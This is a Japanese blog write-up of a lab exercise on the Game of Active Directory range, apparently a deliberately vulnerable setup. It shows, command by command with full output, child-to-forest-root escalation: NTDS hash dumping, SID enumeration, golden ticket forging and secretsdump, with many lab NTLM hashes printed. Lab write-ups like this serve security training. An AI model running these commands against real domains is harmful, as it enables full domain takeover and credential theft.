---
title: "GOAD Writeup Ch4"
date: "2024-10-27"
draft: "false"
---

## Round 4

そろそろ狩るか…♤

最上位の親ドメインであるsevenkingdomsを攻略する

`impacket-raiseChild` で信頼関係のあるsevenkingdomsのNTLMハッシュをダンプする

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-raiseChild north.sevenkingdoms.local/Administrator -hashes :dbd13e1c4e338284ac4e9874f7de6ef4
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Raising child domain north.sevenkingdoms.local
[*] Forest FQDN is: sevenkingdoms.local
[*] Raising north.sevenkingdoms.local to sevenkingdoms.local
[*] sevenkingdoms.local Enterprise Admin SID is: S-1-5-21-2095540843-66383145-2975355457-519
[*] Getting credentials for north.sevenkingdoms.local
north.sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9cd8721de5b33c59702a9f64787f1ea3:::
north.sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:5ee25c7ef14d94c5a11bb2f794f18df7117a2f309ef29e5e9a5e17b79302e74d
/usr/share/doc/python3-impacket/examples/raiseChild.py:910: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  tenYearsFromNow = datetime.datetime.utcnow() + datetime.timedelta(days=365*10)
[*] Getting credentials for sevenkingdoms.local
sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:20c52248354cb5f4cce513c736ce99a5:::
sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:de6bb26a50c69a134f5a1863dd57d2cacc33e360eed075f948fb230701fb3cb8
[*] Target User account name is Administrator
sevenkingdoms.local/Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
sevenkingdoms.local/Administrator:aes256-cts-hmac-sha1-96s:bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
```

味気がないので手元でゴールデンキーを作って試す。

まずはnorth.sevenkingdoms.localのkrbtgtのNTLMハッシュを取得する

というかntdsダンプする

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc smb north.sevenkingdoms.local -u Administrator -H aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4 --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)                                                                                                                                      
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.11   445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
SMB         192.168.56.11   445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.11   445    WINTERFELL       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9cd8721de5b33c59702a9f64787f1ea3:::
SMB         192.168.56.11   445    WINTERFELL       vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.11   445    WINTERFELL       arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
SMB         192.168.56.11   445    WINTERFELL       eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
SMB         192.168.56.11   445    WINTERFELL       catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
SMB         192.168.56.11   445    WINTERFELL       robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
SMB         192.168.56.11   445    WINTERFELL       sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
SMB         192.168.56.11   445    WINTERFELL       brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
SMB         192.168.56.11   445    WINTERFELL       rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
SMB         192.168.56.11   445    WINTERFELL       hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
SMB         192.168.56.11   445    WINTERFELL       jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
SMB         192.168.56.11   445    WINTERFELL       samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
SMB         192.168.56.11   445    WINTERFELL       jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
SMB         192.168.56.11   445    WINTERFELL       sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
SMB         192.168.56.11   445    WINTERFELL       WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:77681f192335d80e476b29aabe77c9bf:::
SMB         192.168.56.11   445    WINTERFELL       CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:20425334e9f78d883485696487ab1b67:::
SMB         192.168.56.11   445    WINTERFELL       SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:f85ab966533246d54fc98f68f6741dd8:::
SMB         192.168.56.11   445    WINTERFELL       [+] Dumped 19 NTDS hashes to /home/kali/.nxc/logs/WINTERFELL_192.168.56.11_2024-10-26_222548.ntds of which 16 were added to the database
SMB         192.168.56.11   445    WINTERFELL       [*] To extract only enabled accounts from the output file, run the following command: 
SMB         192.168.56.11   445    WINTERFELL       [*] cat /home/kali/.nxc/logs/WINTERFELL_192.168.56.11_2024-10-26_222548.ntds | grep -iv disabled | cut -d ':' -f1
SMB         192.168.56.11   445    WINTERFELL       [*] grep -iv disabled /home/kali/.nxc/logs/WINTERFELL_192.168.56.11_2024-10-26_222548.ntds | cut -d ':' -f1
```

krbtgtのハッシュをゲット。

次いでDomain SIDを取得していく

まずは192.168.56.11

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-lookupsid -domain-sids north.sevenkingdoms.local/Administrator@192.168.56.11 -hashes aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.56.11
[*] StringBinding ncacn_np:192.168.56.11[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2343606889-1312097775-3500245986
500: NORTH\Administrator (SidTypeUser)
501: NORTH\Guest (SidTypeUser)
502: NORTH\krbtgt (SidTypeUser)
512: NORTH\Domain Admins (SidTypeGroup)
513: NORTH\Domain Users (SidTypeGroup)
514: NORTH\Domain Guests (SidTypeGroup)
515: NORTH\Domain Computers (SidTypeGroup)
516: NORTH\Domain Controllers (SidTypeGroup)
517: NORTH\Cert Publishers (SidTypeAlias)
520: NORTH\Group Policy Creator Owners (SidTypeGroup)
521: NORTH\Read-only Domain Controllers (SidTypeGroup)
522: NORTH\Cloneable Domain Controllers (SidTypeGroup)
525: NORTH\Protected Users (SidTypeGroup)
526: NORTH\Key Admins (SidTypeGroup)
553: NORTH\RAS and IAS Servers (SidTypeAlias)
571: NORTH\Allowed RODC Password Replication Group (SidTypeAlias)
572: NORTH\Denied RODC Password Replication Group (SidTypeAlias)
1000: NORTH\vagrant (SidTypeUser)
1001: NORTH\WINTERFELL$ (SidTypeUser)
1102: NORTH\DnsAdmins (SidTypeAlias)
1103: NORTH\DnsUpdateProxy (SidTypeGroup)
1104: NORTH\SEVENKINGDOMS$ (SidTypeUser)
1105: NORTH\CASTELBLACK$ (SidTypeUser)
1106: NORTH\Stark (SidTypeGroup)
1107: NORTH\Night Watch (SidTypeGroup)
1108: NORTH\Mormont (SidTypeGroup)
1109: NORTH\AcrossTheSea (SidTypeAlias)
1110: NORTH\arya.stark (SidTypeUser)
1111: NORTH\eddard.stark (SidTypeUser)
1112: NORTH\catelyn.stark (SidTypeUser)
1113: NORTH\robb.stark (SidTypeUser)
1114: NORTH\sansa.stark (SidTypeUser)
1115: NORTH\brandon.stark (SidTypeUser)
1116: NORTH\rickon.stark (SidTypeUser)
1117: NORTH\hodor (SidTypeUser)
1118: NORTH\jon.snow (SidTypeUser)
1119: NORTH\samwell.tarly (SidTypeUser)
1120: NORTH\jeor.mormont (SidTypeUser)
1121: NORTH\sql_svc (SidTypeUser)
```

次に192.168.56.10

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-lookupsid -domain-sids north.sevenkingdoms.local/Administrator@192.168.56.10 -hashes aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.56.10
[*] StringBinding ncacn_np:192.168.56.10[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2095540843-66383145-2975355457
498: SEVENKINGDOMS\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SEVENKINGDOMS\Administrator (SidTypeUser)
501: SEVENKINGDOMS\Guest (SidTypeUser)
502: SEVENKINGDOMS\krbtgt (SidTypeUser)
512: SEVENKINGDOMS\Domain Admins (SidTypeGroup)
513: SEVENKINGDOMS\Domain Users (SidTypeGroup)
514: SEVENKINGDOMS\Domain Guests (SidTypeGroup)
515: SEVENKINGDOMS\Domain Computers (SidTypeGroup)
516: SEVENKINGDOMS\Domain Controllers (SidTypeGroup)
517: SEVENKINGDOMS\Cert Publishers (SidTypeAlias)
518: SEVENKINGDOMS\Schema Admins (SidTypeGroup)
519: SEVENKINGDOMS\Enterprise Admins (SidTypeGroup)
520: SEVENKINGDOMS\Group Policy Creator Owners (SidTypeGroup)
521: SEVENKINGDOMS\Read-only Domain Controllers (SidTypeGroup)
522: SEVENKINGDOMS\Cloneable Domain Controllers (SidTypeGroup)
525: SEVENKINGDOMS\Protected Users (SidTypeGroup)
526: SEVENKINGDOMS\Key Admins (SidTypeGroup)
527: SEVENKINGDOMS\Enterprise Key Admins (SidTypeGroup)
553: SEVENKINGDOMS\RAS and IAS Servers (SidTypeAlias)
571: SEVENKINGDOMS\Allowed RODC Password Replication Group (SidTypeAlias)
572: SEVENKINGDOMS\Denied RODC Password Replication Group (SidTypeAlias)
1000: SEVENKINGDOMS\vagrant (SidTypeUser)
1001: SEVENKINGDOMS\KINGSLANDING$ (SidTypeUser)
1102: SEVENKINGDOMS\DnsAdmins (SidTypeAlias)
1103: SEVENKINGDOMS\DnsUpdateProxy (SidTypeGroup)
1104: SEVENKINGDOMS\NORTH$ (SidTypeUser)
1105: SEVENKINGDOMS\ESSOS$ (SidTypeUser)
1106: SEVENKINGDOMS\Lannister (SidTypeGroup)
1107: SEVENKINGDOMS\Baratheon (SidTypeGroup)
1108: SEVENKINGDOMS\Small Council (SidTypeGroup)
1109: SEVENKINGDOMS\DragonStone (SidTypeGroup)
1110: SEVENKINGDOMS\KingsGuard (SidTypeGroup)
1111: SEVENKINGDOMS\DragonRider (SidTypeGroup)
1112: SEVENKINGDOMS\AcrossTheNarrowSea (SidTypeAlias)
1113: SEVENKINGDOMS\tywin.lannister (SidTypeUser)
1114: SEVENKINGDOMS\jaime.lannister (SidTypeUser)
1115: SEVENKINGDOMS\cersei.lannister (SidTypeUser)
1116: SEVENKINGDOMS\tyron.lannister (SidTypeUser)
1117: SEVENKINGDOMS\robert.baratheon (SidTypeUser)
1118: SEVENKINGDOMS\joffrey.baratheon (SidTypeUser)
1119: SEVENKINGDOMS\renly.baratheon (SidTypeUser)
1120: SEVENKINGDOMS\stannis.baratheon (SidTypeUser)
1121: SEVENKINGDOMS\petyer.baelish (SidTypeUser)
1122: SEVENKINGDOMS\lord.varys (SidTypeUser)
1123: SEVENKINGDOMS\maester.pycelle (SidTypeUser)
```

`192.168.56.11:S-1-5-21-2343606889-1312097775-3500245986`

`192.168.56.10:S-1-5-21-2095540843-66383145-2975355457`

krbtgtのハッシュと昇格したいドメインのSIDがわかったのでゴールデンチケットを作成する

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-ticketer -nthash 9cd8721de5b33c59702a9f64787f1ea3 -domain-sid S-1-5-21-2343606889-1312097775-3500245986 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-2095540843-66383145-2975355457-519 goldenuser
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for north.sevenkingdoms.local/goldenuser
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in goldenuser.ccache
```

そしてゴールデンチケットを使ってsecretsdump

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ export KRB5CCNAME=goldenuser.ccache 
                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-secretsdump -k -no-pass -just-dc-ntlm north.sevenkingdoms.local/goldenuser@kingslanding.sevenkingdoms.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:20c52248354cb5f4cce513c736ce99a5:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
tywin.lannister:1113:aad3b435b51404eeaad3b435b51404ee:af52e9ec3471788111a6308abff2e9b7:::
jaime.lannister:1114:aad3b435b51404eeaad3b435b51404ee:12e3795b7dedb3bb741f2e2869616080:::
cersei.lannister:1115:aad3b435b51404eeaad3b435b51404ee:c247f62516b53893c7addcf8c349954b:::
tyron.lannister:1116:aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998:::
robert.baratheon:1117:aad3b435b51404eeaad3b435b51404ee:9029cf007326107eb1c519c84ea60dbe:::
joffrey.baratheon:1118:aad3b435b51404eeaad3b435b51404ee:3b60abbc25770511334b3829866b08f1:::
renly.baratheon:1119:aad3b435b51404eeaad3b435b51404ee:1e9ed4fc99088768eed631acfcd49bce:::
stannis.baratheon:1120:aad3b435b51404eeaad3b435b51404ee:d75b9fdf23c0d9a6549cff9ed6e489cd:::
petyer.baelish:1121:aad3b435b51404eeaad3b435b51404ee:6c439acfa121a821552568b086c8d210:::
lord.varys:1122:aad3b435b51404eeaad3b435b51404ee:52ff2a79823d81d6a3f4f8261d7acc59:::
maester.pycelle:1123:aad3b435b51404eeaad3b435b51404ee:9a2a96fa3ba6564e755e8d455c007952:::
KINGSLANDING$:1001:aad3b435b51404eeaad3b435b51404ee:f661727e5c8df73a4d6bc2892ff5bda6:::
NORTH$:1104:aad3b435b51404eeaad3b435b51404ee:35296a99e4d4c1f512b05b4486ff56aa:::
ESSOS$:1105:aad3b435b51404eeaad3b435b51404ee:86ac8394a5c6af4329886bf9e4d58407:::
[*] Cleaning up...
```

おわり